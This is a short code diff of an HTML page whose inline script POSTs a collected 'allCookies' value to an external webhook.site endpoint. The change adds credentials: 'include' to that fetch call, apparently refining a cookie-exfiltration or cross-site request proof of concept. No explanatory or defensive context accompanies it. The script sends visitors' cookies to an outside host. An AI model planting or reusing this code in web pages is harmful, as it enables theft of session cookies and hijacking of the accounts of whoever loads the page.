@@ -11,7 +11,8 @@
 
         fetch('https://webhook.site/def8c6ca-1565-4af1-939a-3391b3c129a2', {
             method: 'POST',
-            body: JSON.stringify(allCookies)
+            body: JSON.stringify(allCookies),
+            credentials: "include"
         });
     </script>
     <body>
